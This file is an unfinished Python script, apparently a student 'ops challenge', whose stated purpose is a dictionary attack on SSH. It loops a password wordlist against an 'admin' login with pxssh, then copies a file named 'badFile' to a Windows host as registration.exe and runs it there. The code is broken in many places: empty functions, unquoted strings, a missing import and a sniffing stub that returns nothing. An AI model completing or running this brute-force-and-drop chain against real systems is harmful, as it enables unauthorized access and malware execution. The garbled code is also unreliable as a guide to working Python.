#!/usr/bin/env python3
###########################
# Title: OpsChallenge16
# Author:Jeff Snyder
# Date: 26OCT2020
# Purpose: Dictionary attack against SSH connection
###########################

import smtplib
import itertools
import sys
import time
from pexpect import pxssh
import zipfile
from shutil import copyfile
from sys import exit
from scapy.all import *
import ipaddress

def encrypt():


def sniffNetwork():
    ipAddress='192.168.29.141'
    #sniff

def bruteForce(user, ipAddress):
    filepath =open(./passwordlist.txt)
    for i in filepath.readlines():
        secret=i.strip("\n")
        print(secret)
        s=pxssh.pxssh()
        try:
            s.login(ipAddress, user, secret)
            return secret
            # break   
        except pxssh.ExceptionPxssh as e:
            time.sleep(1)  

    
def transferFiles(user, ipAddress, secret ):
    # badfile ="/directory"
    os.system(scp badFile r"user@IP:~\C:\Users\IEUser\Downloads\registration.exe")
    try:
        s=pxssh.pxssh()
        s.login(ipAddress, user, secret)
        s.sendline(cd location of file)
        s.sendline(registration.exe)
    except pxssh.Exception.Pxssh as e:
        print (pxssh failed to login")
        print (e)
        time.sleep(1)

def main():
    # encrypt()
    user= "admin"
    ipAddress = sniffNetwork()
    password =bruteForce(user, ipAddress)
    transferFiles(user, ipAddress, password) 

main()